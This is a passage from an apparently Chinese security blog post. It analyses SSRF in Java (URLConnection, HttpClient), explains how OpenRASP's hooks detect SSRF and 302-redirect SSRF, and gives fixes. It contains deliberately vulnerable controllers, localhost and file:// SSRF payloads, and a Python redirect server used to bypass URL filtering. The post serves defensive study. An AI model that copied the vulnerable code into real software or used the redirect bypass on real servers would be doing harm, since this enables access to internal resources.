class="comment">//URlConnection是一个抽象类，有两个直接子类，分别是HttpURLConnection和JarURLConnection。</span></span><br><span class="line"><span class="comment">//默认情况下，URLConnection的传参没有有效控制时会引起SSRF漏洞。</span></span><br><span class="line"><span class="comment">//下面代码中，如果将urlConnection变量，强制转型为HttpURLConnection，则无法利用file协议的SSRF漏洞。即代码凡是带http都只支持http、https协议；</span></span><br><span class="line"><span class="type">HttpURLConnection</span> <span class="variable">httpUrl</span> <span class="operator">=</span> (HttpURLConnection)urlConnection;</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="meta">@RequestMapping(&quot;ssrf&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">ssrf</span><span class="params">(String url, HttpServletResponse response)</span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(url);</span><br><span class="line">        <span class="type">URLConnection</span> <span class="variable">urlConnection</span> <span class="operator">=</span> u.openConnection();</span><br><span class="line">        <span class="comment">//HttpURLConnection httpUrl = (HttpURLConnection)urlConnection;直接替换下面urlConnection为httpUrl。</span></span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(urlConnection.getInputStream(),<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">html</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        String htmlContent;</span><br><span class="line">        <span class="keyword">while</span> ((htmlContent = in.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            html.append(htmlContent);</span><br><span class="line">        &#125;</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="type">ServletOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">        os.write(html.toString().getBytes());</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        System.out.println(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//payload</span></span><br><span class="line">http:<span class="comment">//127.0.0.1:8083/ssrf?url=http://127.0.0.1:8090/1.txt</span></span><br><span class="line">http:<span class="comment">//127.0.0.1:8083/ssrf?url=file:///D:/TargetDir/1.txt</span></span><br></pre></td></tr></table></figure><h3 id="2-HttpClient实现"><a href="#2-HttpClient实现" class="headerlink" title="2.HttpClient实现"></a>2.HttpClient实现</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//引入依赖</span></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.httpcomponents&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;httpclient&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">4.5</span><span class="number">.14</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//HttpClient提供了支持HTTP协议的客户端编程工具包，但显然这种写法不支持file协议</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;httpClient&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">ssrfClient</span><span class="params">(String url,HttpServletResponse response)</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="type">HttpClient</span> <span class="variable">client</span> <span class="operator">=</span> HttpClients.createDefault();</span><br><span class="line">        <span class="type">HttpGet</span> <span class="variable">httpGet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpGet</span>(url);</span><br><span class="line">        <span class="type">HttpResponse</span> <span class="variable">res</span> <span class="operator">=</span> client.execute(httpGet);</span><br><span class="line">        <span class="comment">// 读取服务器响应数据</span></span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(res.getEntity().getContent()));</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">resultBuffer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        String temp=<span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> ((temp = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            resultBuffer.append(temp);</span><br><span class="line">        &#125;</span><br><span class="line">        br.close();</span><br><span class="line">        <span class="type">ServletOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">        os.write(resultBuffer.toString().getBytes());</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        System.out.println(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//payload</span></span><br><span class="line">http:<span class="comment">//127.0.0.1:8083/httpClient?url=http://127.0.0.1:8090/1.txt</span></span><br></pre></td></tr></table></figure><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>​SSRF漏洞审计，通常可以从一些http请求函数入手。修复方式考虑以下几种，总结为增加权限、统一错误信息、限制域名IP端口协议等内容、设置访问白名单：</p><ul><li>增加访问权限。</li><li>限制请求的端口为http常用端口，比如80、443、8080、8090等。</li><li>同意错误信息，避免根据错误信息远端服务器的端口状态。</li><li>根据业务需求，判定所需的域名是否是常用的几个，若是，则将这几个特定域名加入白名单，并拒绝白名单域名之外的请求。</li><li>禁用不需要的协议，仅仅允许http和https请求。</li><li>根据请求来源，判定请求地址是否是固定请求来源，若是，则将这几个特定域名&#x2F;IP添加到白名单，并拒绝白名单域名&#x2F;IP之外的请求。</li><li>若业务需求和请求来源并不固定，则可编写函数，检测特定域名、判断是否是内网IP、判断是否为http&#x2F;https协议等。</li></ul><h2 id="OpenRASP检测流程"><a href="#OpenRASP检测流程" class="headerlink" title="OpenRASP检测流程"></a>OpenRASP检测流程</h2><p>远程调试：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -javaagent:D:\javaProject\testRASP\target\rasp\rasp.jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9193 -jar rasp-0.0.1-SNAPSHOT.jar</span><br></pre></td></tr></table></figure><p>以agent方式启动springboot项目：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -javaagent:D:\javaProject\testRASP\target\rasp\rasp.jar -jar rasp-0.0.1-SNAPSHOT.jar(springboot项目.jar)</span><br></pre></td></tr></table></figure><h3 id="HttpClientHook"><a href="#HttpClientHook" class="headerlink" title="HttpClientHook"></a>HttpClientHook</h3><p>应用类：org&#x2F;apache&#x2F;http&#x2F;impl&#x2F;client&#x2F;CloseableHttpClient、org&#x2F;apache&#x2F;http&#x2F;impl&#x2F;client&#x2F;AutoRetryHttpClient、org&#x2F;apache&#x2F;http&#x2F;impl&#x2F;client&#x2F;DecompressingHttpClient、org&#x2F;apache&#x2F;http&#x2F;impl&#x2F;client&#x2F;AbstractHttpClient</p><p>hook类：HttpClientHook</p><p>​hookMethod考虑到http client的不同版本，从接口角度进行匹配，只有实现了HttpClient接口（感觉isClassMatched已经做到），才会对该拦截类插桩。</p><p>​进一步考虑到client.execute方法的多态性，根据方法签名（即形参+返回值）的不同调用检测代码checkHttpHost或checkHttpUri，这两个方法逻辑一致，都是从应用类方法execute的形参HttpUriRequest或形参HttpHost提取出url、hostname、function（即参数，requestmapping）、port、ip信息，传递给HookHandler.doCheck进入检测逻辑。SSRF漏洞的检测，仍交给V8AttackChecker去做。</p><p>​上述检测代码checkHttpHost或checkHttpUri被插桩在client.execute方法执行前，而exitCheck被插桩在client.execute方法执行执行后，被传入的参数是execute的第一个形参和返回值。在我的测试中，checkHttpHost就已经阻断对“ <a href="http://127.0.0.1:8090/1.txt">http://127.0.0.1:8090/1.txt</a> ”的访问，进入exitCheck方法时response为null，从而跳过该检测。exitCheck方法，从线程私有变量uriCache提取出重定向url，将本次请求url和重定向url同时放入params，并交给HookHandler.doCheck进入V8检测。</p><p>​（这部分比较迷，什么情况下会出现重定向还是没看懂…业务代码本身不就是对新url的访问？）</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//位于HttpClientHook的hookMethod方法</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">hookMethod</span><span class="params">(CtClass ctClass)</span> <span class="keyword">throws</span> IOException, CannotCompileException, NotFoundException &#123;</span><br><span class="line">    CtClass[] interfaces = ctClass.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (interfaces != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (CtClass inter : interfaces) &#123;</span><br><span class="line">            <span class="comment">// hook的应用类需要实现HttpClient接口，感觉和isClassMatched方法有重复</span></span><br><span class="line">            <span class="keyword">if</span> (inter.getName().equals(<span class="string">&quot;org.apache.http.client.HttpClient&quot;</span>)) &#123;</span><br><span class="line">                <span class="comment">//穷举client类多态的execute方法</span></span><br><span class="line">                LinkedList&lt;CtBehavior&gt; methods =</span><br><span class="line">                    getMethod(ctClass, <span class="string">&quot;execute&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">                <span class="comment">//$1应该表示第一个形参，$_表示方法的返回值</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">afterSrc</span> <span class="operator">=</span> getInvokeStaticSrc(HttpClientHook.class, <span class="string">&quot;exitCheck&quot;</span>,</span><br><span class="line">                                                     <span class="string">&quot;$1,$_&quot;</span>, Object.class, Object.class);</span><br><span class="line">                <span class="comment">//根据多态的execute方法的第一个形参，在excute方法执行前插入checkHttpUri或者checkHttpHost</span></span><br><span class="line">                <span class="keyword">for</span> (CtBehavior method : methods) &#123;</span><br><span class="line">                    <span class="comment">//方法标签：（新参）返回值，其中类名前的L代表对象类型，[代表数组</span></span><br><span class="line">                    <span class="keyword">if</span> (method.getSignature().startsWith(<span class="string">&quot;(Lorg/apache/http/client/methods/HttpUriRequest&quot;</span>)) &#123;</span><br><span class="line">                        <span class="comment">//可以看到，javassist通过$1获取应用类方法的形参</span></span><br><span class="line">                        <span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(HttpClientHook.class,</span><br><span class="line">                                                        <span class="string">&quot;checkHttpUri&quot;</span>, <span class="string">&quot;$1&quot;</span>, Object.class);</span><br><span class="line">                        insertBefore(method, src);</span><br><span class="line">                        insertAfter(method, afterSrc, <span class="literal">true</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.getSignature().startsWith(<span class="string">&quot;(Lorg/apache/http/HttpHost&quot;</span>)) &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(HttpClientHook.class,</span><br><span class="line">                                                        <span class="string">&quot;checkHttpHost&quot;</span>, <span class="string">&quot;$1&quot;</span>, Object.class);</span><br><span class="line">                        insertBefore(method, src);</span><br><span class="line">                        insertAfter(method, afterSrc, <span class="literal">true</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//checkHttpUri或者checkHttpHost方法</span></span><br><span class="line">isChecking.set(<span class="literal">true</span>);  <span class="comment">//isChecking是ThreadLocal变量</span></span><br><span class="line"><span class="comment">//最终在getSsrfParam获取params</span></span><br><span class="line">HashMap&lt;String, Object&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">params.put(<span class="string">&quot;url&quot;</span>, url);</span><br><span class="line">params.put(<span class="string">&quot;hostname&quot;</span>, hostname);</span><br><span class="line">params.put(<span class="string">&quot;function&quot;</span>, function);</span><br><span class="line">params.put(<span class="string">&quot;port&quot;</span>, port);</span><br><span class="line">LinkedList&lt;String&gt; ip = getIpList(hostname);</span><br><span class="line">Collections.sort(ip);</span><br><span class="line">params.put(<span class="string">&quot;ip&quot;</span>, ip);</span><br><span class="line">HookHandler.doCheck(CheckParameter.Type.SSRF, params);</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//exitCheck方法</span></span><br><span class="line"><span class="keyword">if</span> (isChecking.get() &amp;&amp; response != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">URI</span> <span class="variable">redirectUri</span> <span class="operator">=</span> HttpClientRedirectHook.uriCache.get();</span><br><span class="line">    <span class="keyword">if</span> (redirectUri != <span class="literal">null</span>) &#123;</span><br><span class="line">        HashMap&lt;String, Object&gt; params = getSsrfParam(uriValue);</span><br><span class="line">        <span class="keyword">if</span> (params != <span class="literal">null</span>) &#123;</span><br><span class="line">            HashMap&lt;String, Object&gt; redirectParams = getSsrfParamFromURI(redirectUri);</span><br><span class="line">            <span class="keyword">if</span> (redirectParams != <span class="literal">null</span>) &#123;</span><br><span class="line">                AbstractRedirectHook.checkHttpClientRedirect(params, redirectParams, response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">HookHandler.doCheck(CheckParameter.Type.SSRF_REDIRECT, params);</span><br></pre></td></tr></table></figure><h3 id="URLConnectionHook"><a href="#URLConnectionHook" class="headerlink" title="URLConnectionHook"></a>URLConnectionHook</h3><p>应用类：sun&#x2F;net&#x2F;www&#x2F;protocol&#x2F;http&#x2F;HttpURLConnection、weblogic&#x2F;net&#x2F;http&#x2F;HttpURLConnection</p><p>hook类：URLConnectionHook</p><p>​ 检测代码checkHttpConnection和onExit，分别会被插桩在urlConnection.getInputStream执行前后。checkHttpConnection方法逻辑同上，将url、hostname、function（即参数，requestmapping）、port、ip信息放入params，交给V8检测，并设置isChecking和originCache两个线程缓存。</p><p>​onExit方法，会从URLConnectionRedirectHook.urlCache缓存中取出重定向url，V8检测本次请求url和重定向url相关信息。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//URLConnectionHook类的hookMethod方法</span></span><br><span class="line"><span class="comment">//这里参数$0应该表示this，即该URLConnection实例</span></span><br><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(URLConnectionHook.class, <span class="string">&quot;checkHttpConnection&quot;</span>,</span><br><span class="line">                                <span class="string">&quot;$0&quot;</span>, URLConnection.class);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;getInputStream&quot;</span>, <span class="string">&quot;()Ljava/io/InputStream;&quot;</span>, src);</span><br><span class="line">src = getInvokeStaticSrc(URLConnectionHook.class, <span class="string">&quot;onExit&quot;</span>, <span class="string">&quot;$0&quot;</span>, Object.class);</span><br><span class="line">insertAfter(ctClass, <span class="string">&quot;getInputStream&quot;</span>, <span class="string">&quot;()Ljava/io/InputStream;&quot;</span>, src, <span class="literal">true</span>);</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//checkHttpConnection方法</span></span><br><span class="line">isChecking.set(<span class="literal">true</span>);</span><br><span class="line"><span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> urlConnection.getURL();</span><br><span class="line">HashMap&lt;String, Object&gt; param = getSsrfParamWithURL(url);<span class="comment">//获取的所有信息同HttpClientHook类</span></span><br><span class="line">HookHandler.doCheck(CheckParameter.Type.SSRF, params);</span><br><span class="line">originCache.set(param);</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//onExit方法</span></span><br><span class="line"><span class="keyword">if</span> (isChecking.get() &amp;&amp; !isExit.get() &amp;&amp; URLConnectionRedirectHook.urlCache.get() != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// 以下会继续调用 getinpustream isExit 避免死循环</span></span><br><span class="line">    isExit.set(<span class="literal">true</span>);</span><br><span class="line">    HashMap&lt;String, Object&gt; cache = originCache.get();</span><br><span class="line">    HashMap&lt;String, Object&gt; redirectCache = getSsrfParamWithURL(URLConnectionRedirectHook.urlCache.get());</span><br><span class="line">    <span class="keyword">if</span> (cache != <span class="literal">null</span> &amp;&amp; redirectCache != <span class="literal">null</span>) &#123;</span><br><span class="line">        AbstractRedirectHook.checkRedirect(cache, redirectCache,</span><br><span class="line">                                           ((HttpURLConnection) urlConnection).getResponseMessage(), ((HttpURLConnection) urlConnection).getResponseCode());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">HookHandler.doCheck(CheckParameter.Type.SSRF_REDIRECT, params);</span><br></pre></td></tr></table></figure><h3 id="HttpClientRedirectHook（302重定向SSRF）"><a href="#HttpClientRedirectHook（302重定向SSRF）" class="headerlink" title="HttpClientRedirectHook（302重定向SSRF）"></a>HttpClientRedirectHook（302重定向SSRF）</h3><p>应用类：org&#x2F;apache&#x2F;http&#x2F;impl&#x2F;client&#x2F;DefaultRedirectStrategy、org&#x2F;apache&#x2F;http&#x2F;impl&#x2F;client&#x2F;DefaultRedirectHandler</p><p>hook类：HttpClientRedirectHook</p><p>​在client.execute方法返回前，OpenRASP将检测代码exitCheck插桩到该位置执行，exitCheck方法会先从HttpClientRedirectHook的线程变量uriCache拿到重定向url，再将本次请求url和重定向url交给V8。在当时的测试用例中，response为null导致没有进入这部分检测逻辑，其实这是在检测另一种攻击方式，302重定向SSRF，这里我们对它展开分析。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//模型</span></span><br><span class="line">服务端接口：http:<span class="comment">//192.168.1.3:8083/httpClient</span></span><br><span class="line">重定向服务：python38 302redirect.py <span class="number">8091</span> http:<span class="comment">//127.0.0.1:8090/1.txt </span></span><br><span class="line">攻击目标：python38 -m http.server --bind <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8090</span></span><br><span class="line">payload：http:<span class="comment">//192.168.1.3:8083/httpClient?url=http://mtw.so/5Ct624</span></span><br><span class="line">短链接转换器：相当于存储了key-value：http:<span class="comment">//mtw.so/5Ct624 - http://192.168.1.3:8091</span></span><br></pre></td></tr></table></figure><h4 id="302重定向SSRF"><a href="#302重定向SSRF" class="headerlink" title="302重定向SSRF"></a>302重定向SSRF</h4><p>​302重定向是服务端发起的，浏览器使用者无法控制。很常见的功能是，用户在浏览器登录界面输入用户名和密码正确后，服务端将页面重定向到登陆成功页面。以OpenRASP为例，用户请求 <a href="http://127.0.0.1:8083/httpClient?url=127.0.0.1:8090/1.txt">http://127.0.0.1:8083/httpClient?url=127.0.0.1:8090/1.txt</a> 时，被SSRF检测阻断，这时候服务端返回的response状态码是302，Location字段就是小恐龙页面地址，浏览器会自动解析出该地址，跳转到小恐龙页面。</p><p>​那302重定向如何应用在SSRF呢？</p><p>​因为此时服务端充当了上述模型中浏览器的角色。在HttpClient业务代码中，假设用户请求为 <a href="http://192.168.1.3:8083/httpClient?url=http://mtw.so/5Ct624">http://192.168.1.3:8083/httpClient?url=http://mtw.so/5Ct624</a> ，其中 <a href="http://mtw.so/5Ct624">http://mtw.so/5Ct624</a> 充当302跳转服务。该跳转服务的功能很简单，返回的response是302，Location字段为“ <a href="http://127.0.0.1:8090/1.txt">http://127.0.0.1:8090/1.txt</a> ”。</p><p>​这样HttpClient业务代码中，url为 <a href="http://mtw.so/5Ct624">http://mtw.so/5Ct624</a> 不是内网地址，不会触发SSRF检测，服务端client.execute(url)后获得重定向地址为“ <a href="http://127.0.0.1:8090/1.txt">http://127.0.0.1:8090/1.txt</a> ”，client.execute(url)内部的重定向机制会自动访问该重定向地址，从而绕过HttpClient业务代码中对传参url的过滤。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> HTTPServer, BaseHTTPRequestHandler</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)-<span class="number">1</span> != <span class="number">2</span>:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Usage: &#123;&#125; &lt;port_number&gt; &lt;url&gt;&quot;</span>.<span class="built_in">format</span>(sys.argv[<span class="number">0</span>]))</span><br><span class="line">  sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Redirect</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">    self.send_response(<span class="number">302</span>)</span><br><span class="line">    self.send_header(<span class="string">&#x27;Location&#x27;</span>, sys.argv[<span class="number">2</span>])</span><br><span class="line">    self.end_headers()</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">send_error</span>(<span class="params">self, code, message=<span class="literal">None</span></span>):</span><br><span class="line">    self.send_response(<span class="number">302</span>)</span><br><span class="line">    self.send_header(<span class="string">&#x27;Location&#x27;</span>, sys.argv[<span class="number">2</span>])</span><br><span class="line">    self.end_headers()</span><br><span class="line"></span><br><span class="line">HTTPServer((<span class="string">&quot;&quot;</span>, <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])), Redirect).serve_forever()</span><br><span class="line"></span><br><span class="line"><span class="comment"># python38 302redirect.py 8091 http://127.0.0.1:8090/1.txt</span></span><br><span class="line"><span class="comment"># 在本机8091开启重定向服务，对该服务的请求，返回response为302，response头Location字段指向http://127.0.0.1:8090/1.txt</span></span><br></pre></td></tr></table></figure><h4 id="OpenRASP检测重定向"><a href="#OpenRASP检测重定向" class="headerlink" title="OpenRASP检测重定向"></a>OpenRASP检测重定向</h4><p>​OpenRASP对“302重定向SSRF”的检测点，就在client.execute(url)的重定向机制。远程调试上述示例时，观察调用栈如下图，client.execute(url)发现是302重定向时，在重定向逻辑中执行getLocationURI方法，获取重定向地址。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">cacheHttpRedirect:<span class="number">54</span>, HttpClientRedirectHook (com.baidu.openrasp.hook.ssrf.redirect)</span><br><span class="line">getLocationURI:<span class="number">197</span>, DefaultRedirectStrategy (org.apache.http.impl.client)</span><br><span class="line">getRedirect:<span class="number">223</span>, DefaultRedirectStrategy (org.apache.http.impl.client)</span><br><span class="line">execute:<span class="number">126</span>, RedirectExec (org.apache.http.impl.execchain)</span><br><span class="line">doExecute:<span class="number">185</span>, InternalHttpClient (org.apache.http.impl.client)</span><br><span class="line">execute:<span class="number">83</span>, CloseableHttpClient (org.apache.http.impl.client)</span><br><span class="line">execute:<span class="number">108</span>, CloseableHttpClient (org.apache.http.impl.client)</span><br><span class="line">execute:<span class="number">56</span>, CloseableHttpClient (org.apache.http.impl.client)</span><br><span class="line">ssrfClient:<span class="number">49</span>, SSRFController (com.bmsk.rasp.controller)</span><br></pre></td></tr></table></figure><p>​OpenRASP中的hook类HttpClientRedirectHook，将检测代码cacheHttpRedirect插入getLocationURI方法返回前，检测逻辑是将getLocationURI的返回值（即重定向地址）缓存在线程变量uriCache。这样逻辑回到client.execute(url)时，该方法返回前会调用hook类HttpClientHook的exitCheck方法，该方法会对本次请求url和重定向url进行检测，从而阻断SSRF。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//HttpClientRedirectHook类的hookMethod方法</span></span><br><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(HttpClientRedirectHook.class, <span class="string">&quot;cacheHttpRedirect&quot;</span>,</span><br><span class="line">                                <span class="string">&quot;$_&quot;</span>, Object.class);</span><br><span class="line">insertAfter(ctClass, <span class="string">&quot;getLocationURI&quot;</span>, <span class="literal">null</span>, src);</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//cacheHttpRedirect方法</span></span><br><span class="line"><span class="keyword">if</span> (uri <span class="keyword">instanceof</span> URI) &#123;</span><br><span class="line">    uriCache.set((URI) uri);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这样，HttpClientRedirectHook实质上，只是在client.execute(url)执行过程中，缓存了重定向url。HttpClientHook则在client.execute(url)执行前对url检测，检测目标是CheckParameter.Type.SSRF；在client.execute(url)执行返回前，再对本次请求url和重定向url进行检测，检测目标是CheckParameter.Type.SSRF_REDIRECT，形成了逻辑闭环。</p><p>​在调试过程中，由于我使用短地址 <a href="http://mtw.so/5Ct624">http://mtw.so/5Ct624</a> ，观察到HttpClient重复了两次302重定向。当然这不重要。简单提一下，短地址服务的原理还是302重定向，它相当于存储了key-value键值对，key为 <a href="http://mtw.so/5Ct624">http://mtw.so/5Ct624</a> ，value为 <a href="http://192.168.1.3:8091/">http://192.168.1.3:8091</a> ，当用户请求前者时，会重定向到后者。使用短地址，是因为我没有公网IP，为了观察OpenRASP的SSRF_REDIRECT检测，不至于被OpenRASP的SSRF检测直接通过内网IP阻断掉。</p><p>​调试过程中的另一点认识，burpsuite抓不到127的包，能抓到192的包，说明其工作在wlan网卡，而不是本地环回网卡。</p><p>​服务端防御“302重定向SSRF”的方式很简单，就是限制不能自动跳转：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">httpGet.setConfig(RequestConfig.custom().setRedirectsEnabled(<span class="literal">false</span>).build());</span><br></pre></td></tr></table></figure><h3 id="URLConnectionRedirectHook（302重定向SSRF）"><a href="#URLConnectionRedirectHook（302重定向SSRF）" class="headerlink" title="URLConnectionRedirectHook（302重定向SSRF）"></a>URLConnectionRedirectHook（302重定向SSRF）</h3><p>应用类：sun&#x2F;net&#x2F;www&#x2F;protocol&#x2F;http&#x2F;HttpURLConnection、weblogic&#x2F;net&#x2F;http&#x2F;HttpURLConnection</p><p>hook类：URLConnectionRedirectHook</p><p>​URLConnectionRedirectHook检测逻辑和HttpClientRedirectHook一致，它将监测点插入urlConnection.getInputStream()的重定向机制。重定向机制执行到urlConnection.followRedirect()方法时，会调用检测代码cacheHttpRedirect，在线程变量urlCache中缓存重定向url，配合后续hook类URLConnectionHook的onExit方法，对本次请求url和重定向url进行检测。</p><p>​从调用栈信息也可看到，不管是client.execute(url)，还是urlConnection.getInputStream()，重定向都是在其内部完成，OpenRASP基本也插桩在内部能获取重定向url的位置。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//payload：http://192.168.1.3:8083/ssrf?url=http://mtw.so/5v1FWr</span></span><br><span class="line">cacheHttpRedirect:<span class="number">39</span>, URLConnectionRedirectHook (com.baidu.openrasp.hook.ssrf.redirect)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect) [<span class="number">2</span>]</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">followRedirect:<span class="number">2647</span>, HttpURLConnection (sun.net.www.protocol.http)</span><br><span class="line">getInputStream0:<span class="number">1830</span>, HttpURLConnection (sun.net.www.protocol.http)</span><br><span class="line">getInputStream:<span class="number">1498</span>, HttpURLConnection (sun.net.www.protocol.http)</span><br><span class="line">ssrf:<span class="number">27</span>, SSRFController (com.bmsk.rasp.controller)</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//URLConnectionRedirectHook类的hookMethod方法</span></span><br><span class="line"><span class="comment">//表示将followRedirect的this（urlConnection）、($w)$_不懂啥意思？传入cacheHttpRedirect</span></span><br><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(URLConnectionRedirectHook.class, <span class="string">&quot;cacheHttpRedirect&quot;</span>,</span><br><span class="line"><span class="string">&quot;$0,($w)$_&quot;</span>, Object.class, Object.class);</span><br><span class="line"><span class="comment">//表示followRedirect是无参数，boolean返回值的方法</span></span><br><span class="line">insertAfter(ctClass, <span class="string">&quot;followRedirect&quot;</span>, <span class="string">&quot;()Z&quot;</span>, src, <span class="literal">false</span>);</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//cacheHttpRedirect方法</span></span><br><span class="line"><span class="keyword">if</span> ((Boolean) isRedirect) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        urlCache.set((URL) Reflection.invokeMethod(connection, <span class="string">&quot;getURL&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">        <span class="comment">// ignore</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​禁止自动302重定向：conn.setInstanceFollowRedirects(false);</p><h4 id="JVM中原语类型签名"><a href="#JVM中原语类型签名" class="headerlink" title="JVM中原语类型签名"></a>JVM中原语类型签名</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Character     Type          Interpretation</span><br><span class="line">------------------------------------------</span><br><span class="line">B             <span class="type">byte</span>          signed <span class="type">byte</span></span><br><span class="line">C             <span class="type">char</span>          Unicode character</span><br><span class="line">D             <span 